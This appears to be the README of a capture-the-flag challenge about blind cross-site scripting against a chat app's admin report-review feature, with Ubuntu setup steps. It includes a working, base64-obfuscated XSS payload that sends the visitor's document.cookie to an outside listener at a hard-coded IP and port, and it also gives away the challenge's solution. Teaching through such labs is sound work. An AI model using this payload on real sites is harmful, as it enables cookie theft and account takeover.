The user will fill the login form and be directed to a chat-room.
While the random messages flow in the user will see they can send messages as well,
they will also noticed a report button that takes them to a form. When they submit the
form they will see it tell them an adminiatrator will review their report. The user
will have to perform a blind-XSS attack in order to exfil the admin-cookie that contains
the flag!

Example XSS payload:
```
<img src=x onerror="eval(atob('ZmV0Y2goYGh0dHA6Ly8xMC4yMi40My4yMjk6NDQ0NC8/ZGF0YT0ke2J0b2EoZG9jdW1lbnQuY29va2llKX1gKTs='))">
```

To set this challenge up on Ubuntu:
```bash
# have firefox installed
sudo apt update && sudo apt-get install -y firefox
# move the webdriver where the app.py can access it via $PATH
sudo cp geckodriver -t /usr/local/bin
```
